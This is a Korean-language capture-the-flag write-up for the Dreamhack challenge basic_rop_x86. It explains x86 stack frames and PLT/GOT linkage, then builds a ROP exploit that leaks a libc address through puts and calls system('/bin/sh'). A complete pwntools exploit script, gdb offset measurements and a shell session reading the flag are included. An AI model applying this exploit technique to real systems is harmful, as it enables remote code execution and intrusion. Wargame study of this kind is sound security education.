@@ -1,0 +1,557 @@
+				basic_rop_x86: x86에서의 스택 구성,
+				함수 프롤로그와 에필로그
+
+
+								Author: Kown Young Jung
+
+
+
+---[ Contents
+	1. basic_rop_x86
+	2. x86에서의 스택 구성
+	3. x86에서의 함수 프롤로그와 에필로그
+	4. 문제 풀이
+	5. Reference
+
+
+
+
+
+---[ 1. basic_rop_x86
+ 문제는 다음과 같이 제시된다.[1]
+
+======================================================
+이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x86)의 바이너리와
+소스 코드가 주어집니다.
+Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, “flag”
+파일을 읽으세요.
+“flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{…} 입니다.
+
+__________환경________________
+Ubuntu 16.04
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+______________________________
+
+문제 파일: .gdb_history, basic_rop_x86, basic_rop_x86.c, libc.so.6
+======================================================
+
+---[ 2. x86에서의 스택 구성
+ Intel386 아키텍처 프로세서에서의 System V ABI를 기술한 문서에서는
+표준 스택 프레임의 구성을 다음과 같이 제시하고 있다.[2]
+
+----------------------
+Fig 1.: 표준 스택 프레임
+======================================================
+Position         Contents          Frame
+--------------+-----------------+---------- High address
+4n + 8 (%ebp) | argument word n | Previous
+ ...          | ...             |
+8 (%ebp)      | argument word 0 |
+--------------+-----------------+----------
+4 (%ebp)      | return address  | Current
+              +-----------------+
+0 (%ebp)      | previous %ebp   |
+              | (optional)      |
+              +-----------------+
+-4 (%ebp)     | unspecified     |
+ ...          | ...             |
+0 (%esp)      | variable size   |
+--------------+-----------------+---------- Low address
+======================================================
+
+---[ 3. x86에서의 함수 프롤로그와 에필로그
+ Intel386 아키텍처 프로세서에서의 System V ABI를 기술한 문서에서는
+함수의 프롤로그와 에필로그에 대한 예시를 다음과 같이 제시하고 있다.[3]
+
+--------------------
+Fig 2.: 함수 프롤로그
+======================================================
+prologue:
+	push %ebp		/ save frame pointer
+	movl %esp, %ebp	/save new frame pointer
+	subl $80, %esp	/ allocate stack space
+	pushl %edi		/ save local register
+	pushl %esi		/ save local register
+	pushl %ebx		/ save local register
+	movl %edi, %eax	/ set up return value
+======================================================
+--------------------
+Fig 3.: 함수 에필로그
+======================================================
+epilogue:
+	popl %ebx	/ restore local register
+	popl %esi	/ restore local register
+	popl %edi	/ restore local register
+	leave		/ restore frame pointer
+	ret 		/ pop return address
+======================================================
+
+---[ 4. 문제 풀이
+ 1. 에서 제시된 문제 환경으로부터 ASLR과 NX 비트를 우회할 필요가 있음을
+알 수 있다. 그리고 이를 우회하기 위한 전제 조건은 다음 두 가지이다.
+
+======================================================
+1) 메모리 누수를 일으킬 수 있어야 한다.
+2) 오버플로를 발생시킬 수 있어야 한다.
+======================================================
+
+ 2)은 코드의 일부를 발췌한 것만 봐도 성립한다는 것을 알 수 있다. 즉,
+buf에 할당된 크기는 0x40이지만 read 시스템 호출은 0x400까지 읽어들이므로
+오버플로를 발생시킬 수 있다.
+
+----------------------
+basic_rop_x86.c의 일부
+======================================================
+...
+int main(int argc, char *argv[]) {
+    char buf[0x40] = {};
+
+    initialize();
+
+    read(0, buf, 0x400);
+...
+======================================================
+
+ 1)을 확인하기 위해서는 어떤 함수가 실행파일에 포함되어 있는지 알아봐야 한다.
+메모리 누수를 일으키고 활용하기 위해서는 일반적으로 출력 함수 계열이
+사용되므로 출력 함수가 포함되어 있는지 조사해야 한다. 여기서 오브젝트 파일의
+심볼을 보여주는 nm 명령어를 사용하여 함수의 목록을 얻을 수 있다.
+
+--------------------------
+실행 파일에 포함된 함수 목록
+======================================================
+$ nm basic_rop_x86
+         U alarm@@GLIBC_2.0
+0804857b T alarm_handler
+0804a034 B __bss_start
+0804a048 b completed.7209
+0804a02c D __data_start
+0804a02c W data_start
+080484c0 t deregister_tm_clones
+08048530 t __do_global_dtors_aux
+08049f0c t __do_global_dtors_aux_fini_array_entry
+0804a030 D __dso_handle
+08049f14 d _DYNAMIC
+0804a034 D _edata
+0804a04c B _end
+         U exit@@GLIBC_2.0
+08048694 T _fini
+080486a8 R _fp_hw
+08048550 t frame_dummy
+08049f08 t __frame_dummy_init_array_entry
+080487f4 r __FRAME_END__
+0804a000 d _GLOBAL_OFFSET_TABLE_
+         w __gmon_start__
+080486bc r __GNU_EH_FRAME_HDR
+080483b8 T _init
+08049f0c t __init_array_end
+08049f08 t __init_array_start
+08048592 T initialize
+080486ac R _IO_stdin_used
+         w _ITM_deregisterTMCloneTable
+         w _ITM_registerTMCloneTable
+08049f10 d __JCR_END__
+08049f10 d __JCR_LIST__
+         w _Jv_RegisterClasses
+08048690 T __libc_csu_fini
+08048630 T __libc_csu_init
+         U __libc_start_main@@GLIBC_2.0
+080485d9 T main
+         U puts@@GLIBC_2.0
+         U read@@GLIBC_2.0
+080484f0 t register_tm_clones
+         U setvbuf@@GLIBC_2.0
+         U signal@@GLIBC_2.0
+08048480 T _start
+0804a040 B stdin@@GLIBC_2.0
+0804a044 B stdout@@GLIBC_2.0
+0804a034 D __TMC_END__
+         U write@@GLIBC_2.0
+080484b0 T __x86.get_pc_thunk.bx
+$
+======================================================
+
+ 위 결과에서 출력 함수인 puts, write 시스템 호출을 찾을 수 있다. 여기서는
+puts 함수를 사용하여 puts 함수의 주소를 출력할 것이다.
+ 여기서 잠시 puts 함수의 호출 과정을 알아보자. Intel386 아키텍처
+프로세서에서의 System V ABI를 기술한 문서는 이 과정을 다음과 같이 기술하고
+있다.[4]
+
+---------------------------------------------------
+Fig 4.: 위치 독립적인 코드에서의 프로시저 링키지 테이블
+======================================================
+.PLT0:	pushl	4(%ebx)
+		jmp		*8(%ebx)
+		nop; nop
+		nop; nop
+.PLT1:	jmp		*name1@GOT(%ebx)
+		pushl	$offset
+		jmp		.PLT0@PC
+.PLT2:	jmp		*name2@GOT(%ebx)
+		pushl	$offset
+		jmp		.PLT0@PC
+...
+======================================================
+
+======================================================
+1. 프로그램의 메모리 이미지를 생성할 때, 동적 링커는 전역 오프셋 테이블의
+두 번째와 세 번째 엔트리를 특별한 값으로 설정한다. 이에 대해서는 나중에
+다룰 것이다.
+
+2. 프로시저 링키지 테이블이 위치 독립적이라면, 전역 오프셋 테이블의 주소는
+반드시 %ebx에 저장되어 있어야 한다. 프로그램 이미지에 있는 각각의
+공유 오브젝트 파일은 자신의 프로시저 링키지 테이블을 가지고, 프로시저 링키지
+테이블 엔트리로 제어권이 넘어가는 동작은 오직 같은 오브젝트 파일 내에서만
+일어난다. 결과적으로, 함수 호출자는 프로시저 링키지 테이블 엔트리를 호출하기
+이전에, 전역 오프셋 테이블의 시작 주소를 레지스터에 저장할 책임이 있다.
+
+3. 설명을 위해, 프로그램이 name1이라는 함수를 호출한다고 가정하고, 이는
+제어권을 .PLT1 레이블로 넘길 것이다.
+
+4. 첫 번째 명령어는 name1의 전역 오프셋 테이블 엔트리의 주소로 점프한다.
+초기에, 전역 오프셋 테이블은 두 번째 명령어인 pushl 명령어의 주소를
+가지고 있으며, 이는 name1의 실제 주소가 아니다.
+
+5. 결과적으로, 프로그램은 재위치 오프셋 (offset) 을 스택에 푸시하게 된다.
+재위치 오프셋은 재위치 테이블에 대한 32-비트의 음수가 아닌 바이트 오프셋이다.
+재위치 오프셋을 통해 특정된 재위치 엔트리는 R_386_JMP_SLOT 이라는 타입을
+가질 것이고 이 오프셋은 이전의 jmp 명령어에서 사용되었던 전역 오프셋
+테이블 엔트리를 특정할 것이다. 재위치 엔트리는 또한 심볼 테이블 인덱스를
+포함하므로, 동적 링커에게 어떤 심볼이 참조되고 있는지 전달할 수 있고,
+이 경우에는 name1이 될 것이다.
+
+6. 재위치 오프셋을 푸시한 후, 프로그램은 프로시저 링키지 테이블의 첫 번째
+엔트리인 .PLT0으로 점프한다. .PLT0에서 pushl 명령어는 전역 오프셋 테이블의
+두 번째 엔트리 (got_plus_4 또는 4(%ebx)) 의 값을 스택에 푸시하여, 동적
+링커에게 한 워드의 식별 정보를 준다. 그다음 프로그램은 전역 오프셋 테이블의
+세 번째 엔트리 (got_plus_8 또는 8(%ebx)) 에 존재하는 주소로 점프하고, 이는
+동적 링커에게 제어권을 넘기게 된다.
+
+7. 동적 링커가 제어권을 넘겨받으면, 특정된 재위치 엔트리를 살피고, 심볼의
+값을 찾고, name1의 전역 오프셋 테이블 엔트리에 그 "실제" 주소를 저장한
+다음, 제어권을 요구되는 목적지로 넘긴다.
+
+8. 프로시저 링키지 테이블에 대한 추후의 호출은 동적 링커를 두 번째로
+호출하지 않고 바로 name1로 넘어간다. 즉, .PLT1의 jmp 명령어가 name1로
+넘어갈 것이라는 의미이고, pushl 명령어의 과정을 거치지 않을 것이라는
+뜻이다.
+======================================================
+
+ 위 과정으로부터, puts 함수의 실제 주소를 출력하기 위해서는 puts 함수에
+puts 함수의 전역 오프셋 테이블 엔트리 주소를 인자로 전달해야한다는 것을
+알 수 있다. 그것이 첫 번째 호출이라고 해도 결국 전역 오프셋 테이블 엔트리에
+실제 주소가 저장될 것이고, puts 함수는 그 주소를 출력할 것이기 때문이다.
+이제 얻어야 하는 것은 puts 함수의 프로시저 링키지 테이블 엔트리의 주소와
+전역 오프셋 테이블의 주소이다. 이는 objdump와 grep 명령어를 조합하여
+얻을 수 있다.
+
+======================================================
+$ objdump -D ./basic_rop_x86 | grep -A3 "puts"
+08048420 <puts@plt>:
+ 8048420:	ff 25 18 a0 04 08    	jmp    *0x804a018
+ 8048426:	68 18 00 00 00       	push   $0x18
+ 804842b:	e9 b0 ff ff ff       	jmp    80483e0 <_init+0x28>
+--
+ 8048583:	e8 98 fe ff ff       	call   8048420 <puts@plt>
+ 8048588:	83 c4 04             	add    $0x4,%esp
+ 804858b:	6a ff                	push   $0xffffffff
+ 804858d:	e8 9e fe ff ff       	call   8048430 <exit@plt>
+$
+======================================================
+
+ 위 결과로부터 puts 함수의 프로시저 링키지 테이블 엔트리의 주소는
+0x8048420, 전역 오프셋 테이블 엔트리의 주소는 0x804a018임을 알 수
+있다.
+ 이제 프로그램을 오버플로시켜 puts 함수를 호출하고 그 인자로 puts 함수의
+전역 오프셋 테이블 엔트리의 주소를 전달해야 한다. 먼저 리턴 주소를 puts
+함수의 프로시저 링키지 테이블 엔트리의 주소로 덮어쓴다고 하면 메모리는
+다음과 같은 상태를 가진다.
+
+======================================================
+... [AAAAAA ... ][AAAA][puts 함수 주소] ...
+                 ^     ^
+                 |     |
+                 |     Return Address
+                 Saved Frame Pointer
+======================================================
+
+ 그리고 puts 함수가 리턴 주소로 호출되면 Fig 2., Fig3.에 따라 메모리 상태가
+변하게 된다.
+
+======================================================
+1. ret 명령어가 리턴 주소를 스택에서 꺼내어 명령 포인터에 저장한다.
+(LOW) ... [AAAAA ... ][AAAA][puts 함수 주소][????] ... (HIGH)
+                       ^     ^             ^
+                       |     |             |
+                       |     |             |
+                     Base    Instruction   Stack Pointer
+                     Pointer Pointer
+
+2. puts 함수가 호출되어 base pointer가 푸시된다.
+(LOW) ... [AAAAAA ... ][AAAA][Base Pointer][????] ... (HIGH)
+                        ^    ^
+                        |    |
+                        |    |
+                        Base Stack Pointer 
+                        Pointer
+                        
+3. Stack Pointer의 값이 Base Pointer로 복사되며 새로운 스택 프레임이
+생성된다.
+(LOW) ... [AAAAA ...][AAAA][Base Pointer][????][????][????] ... (HIGH)
+                           ^
+                           |
+                           |
+                           Stack Pointer, Base Pointer
+======================================================
+
+ 마지막 메모리 상태를 Fig 1.에 비추어본다면 다음과 같이 메모리 영역이
+나누어진다.
+
+======================================================
+(LOW) ... [AAAAA ...][AAAA][Base Pointer][????][????][????] ... (HIGH)
+                           ^             ^     ^     ^
+                           |             |     |     |
+                           |             |     |     arg1
+                           |             |     arg0
+                           |             Return Address
+                           Stack Pointer, Base Pointer
+======================================================
+
+ 이로부터 puts 함수를 호출하여 puts 함수의 주소를 출력하는 페이로드는
+다음과 같이 구성할 수 있다.
+
+======================================================
+[ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA....]
+[               AAAA                  ]
+[ puts 함수의 프로시저 링키지 테이블 주소] -> main 함수의 리턴 주소
+[               AAAA                  ] -> puts 함수의 리턴 주소
+[ puts 함수의 전역 오프셋 테이블 주소    ] -> puts 함수의 인자
+======================================================
+
+ 물론, 이것이 끝은 아니다. puts 함수의 주소를 얻은 후에는 libc의 시작 주소를
+구하고 이를 통해 system 함수의 주소를 얻어 다시 main 함수의 리턴 주소로
+넣고 인자로는 "/bin/sh"를 전달해주어야 한다. 이 모든 것을 위해서는 puts
+함수의 오프셋과 system 함수의 오프셋, "/bin/sh"의 오프셋이 필요하다. 이는
+objdump, grep, strings 명령어로 얻을 수 있다.
+
+======================================================
+$ objdump -D libc.so.6 | grep "puts" | grep ">:"
+0005dbf0 <_IO_fputs@@GLIBC_2.0>:
+0005f140 <_IO_puts@@GLIBC_2.0>:
+000674f0 <fputs_unlocked@@GLIBC_2.1>:
+000e9e40 <putspent@@GLIBC_2.0>:
+000eb450 <putsgent@@GLIBC_2.10>:
+$ objdump -D libc.so.6 | grep "system" | grep ">:"
+0003a940 <__libc_system@@GLIBC_PRIVATE>:
+00110840 <svcerr_systemerr@@GLIBC_2.0>:
+$ strings -t x libc.so.6 | grep "/bin/sh"
+ 15902b /bin/sh
+$
+======================================================
+
+ 위 결과로부터 다음을 얻는다.
+
+======================================================
+puts 함수의 오프셋: 0005f140
+system 함수의 오프셋: 0003a940
+"/bin/sh"의 오프셋: 15902b
+======================================================
+
+ 공격을 위한 페이로드를 구성해보면 다음과 같다.
+
+======================================================
+[ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA....]
+[               AAAA                  ]
+[ system 함수의 주소                   ]
+[               AAAA                  ]
+[ "/bin/sh"의 주소                     ]
+======================================================
+
+ 이제 버퍼와 리턴 주소 간 거리를 측정해야 한다. 이는 GDB를 통해
+시행할 수 있다.
+
+======================================================
+$ gdb ./basic_rop_x86
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./basic_rop_x86...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080485d9 <+0>:	push   %ebp
+   0x080485da <+1>:	mov    %esp,%ebp
+   0x080485dc <+3>:	push   %edi
+   0x080485dd <+4>:	sub    $0x40,%esp
+   0x080485e0 <+7>:	lea    -0x44(%ebp),%edx
+   0x080485e3 <+10>:	mov    $0x0,%eax
+   0x080485e8 <+15>:	mov    $0x10,%ecx
+   0x080485ed <+20>:	mov    %edx,%edi
+   0x080485ef <+22>:	rep stos %eax,%es:(%edi)
+   0x080485f1 <+24>:	call   0x8048592 <initialize>
+   0x080485f6 <+29>:	push   $0x400
+   0x080485fb <+34>:	lea    -0x44(%ebp),%eax
+   0x080485fe <+37>:	push   %eax
+   0x080485ff <+38>:	push   $0x0
+   0x08048601 <+40>:	call   0x80483f0 <read@plt>
+   0x08048606 <+45>:	add    $0xc,%esp
+   0x08048609 <+48>:	push   $0x40
+   0x0804860b <+50>:	lea    -0x44(%ebp),%eax
+   0x0804860e <+53>:	push   %eax
+   0x0804860f <+54>:	push   $0x1
+   0x08048611 <+56>:	call   0x8048450 <write@plt>
+   0x08048616 <+61>:	add    $0xc,%esp
+---Type <return> to continue, or q <return> to quit---
+   0x08048619 <+64>:	mov    $0x0,%eax
+   0x0804861e <+69>:	mov    -0x4(%ebp),%edi
+   0x08048621 <+72>:	leave  
+   0x08048622 <+73>:	ret    
+End of assembler dump.
+(gdb) break main
+Breakpoint 1 at 0x80485dd
+(gdb) r
+Starting program: /home/ubuntu/basic_rop_x86/basic_rop_x86 
+
+Breakpoint 1, 0x080485dd in main ()
+(gdb) p/x $ebp - 0x44
+$1 = 0xbfffef84
+(gdb) info frame
+Stack level 0, frame at 0xbfffefd0:
+ eip = 0x80485dd in main; saved eip = 0xb7e20647
+ Arglist at 0xbfffefc8, args: 
+ Locals at 0xbfffefc8, Previous frame's sp is 0xbfffefd0
+ Saved registers:
+  ebp at 0xbfffefc8, eip at 0xbfffefcc
+(gdb) p/x 0xbfffefcc
+$2 = 0xbfffefcc
+(gdb) p/d $2 - $1
+Argument to arithmetic operation not a number or boolean.
+(gdb) p/d 0xbfffefcc - 0xbfffef84
+$3 = 72
+(gdb) 
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 23140] will be killed.
+
+Quit anyway? (y or n) y
+$
+======================================================
+
+ 이제 공격 코드를 작성하기 위한 모든 정보가 수집되었다.여기서는
+공격 코드를 파이썬으로 작성할 것이며 pwntools라는 프레임워크를
+사용할 것이다.
+
+======================================================
+from pwn import *
+
+# p = process("./basic_rop_x86")
+p = remote("host1.dreamhack.games", 15600)
+
+d = 72
+main_addr = "\xd9\x85\x04\x08"  # 0x80485d9
+puts_plt_addr = "\x20\x84\x04\x08" # 0x8048420
+puts_got_addr = "\x18\xa0\x04\x08" # 0x804a018
+puts_offset = 0x5f140
+shell_offset = 0x15902b
+system_offset = 0x3a940
+
+payload = "A" * d
+payload += puts_plt_addr
+payload += main_addr
+payload += puts_got_addr
+
+print(payload)
+p.sendline(payload)
+
+tmps = p.recvline()
+print(tmps[0x40:0x44])
+
+libc_base = u32(tmps[0x40:0x44]) - puts_offset
+shell_addr = p32(libc_base + shell_offset)
+print(hex(libc_base))
+print(hex(u32(shell_addr)))
+
+payload = "A" * d
+payload += puts_plt_addr
+payload += main_addr
+payload += shell_addr
+
+p.sendline(payload)
+print(p.recvline())
+
+system_addr = p32(libc_base + system_offset)
+print(hex(u32(system_addr)))
+
+payload = "A" * d
+payload += system_addr
+payload += main_addr
+payload += shell_addr
+
+p.sendline(payload)
+p.interactive()
+======================================================
+
+ 위 코드를 실행시키면 다음을 얻는다.
+
+======================================================
+$ python2 exploit.py 
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/ubuntu/
+    .cache/.pwntools-cache-2.7/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf
+    (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] You have the latest version of Pwntools (4.7.0)
+[+] Opening connection to host2.dreamhack.games on port 8884: Done
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+\x84\x04م\x04\x18\x04@���
+0xf7de0000
+0xf7f3902b
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
+
+0xf7e1a940
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls
+basic_rop_x86
+flag
+$ cat flag
+DH{ff3976e1fcdb03267e8d1451e56b90a5}$ exit
+$ 
+
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while
+reading in interactive
+$ 
+$ 
+[*] Interrupted
+[*] Closed connection to host2.dreamhack.games port 8884
+$ 
+======================================================
+
+---[ 5. Reference
+[1] Dreamhack, "https://dreamhack.io/wargame/challenges/30/",
+Dreamhack
+[2] "SYSTEM V APPLICATION BINARY INTERFACE Intel386 Architecture
+Processor Supplement", The Santa Cruz Operation, Inc., pp. 36
+[3] "SYSTEM V APPLICATION BINARY INTERFACE Intel386 Architecture
+Processor Supplement", The Santa Cruz Operation, Inc., pp. 39-40
+[4] "SYSTEM V APPLICATION BINARY INTERFACE Intel386 Architecture
+Processor Supplement", The Santa Cruz Operation, Inc., pp. 89-90
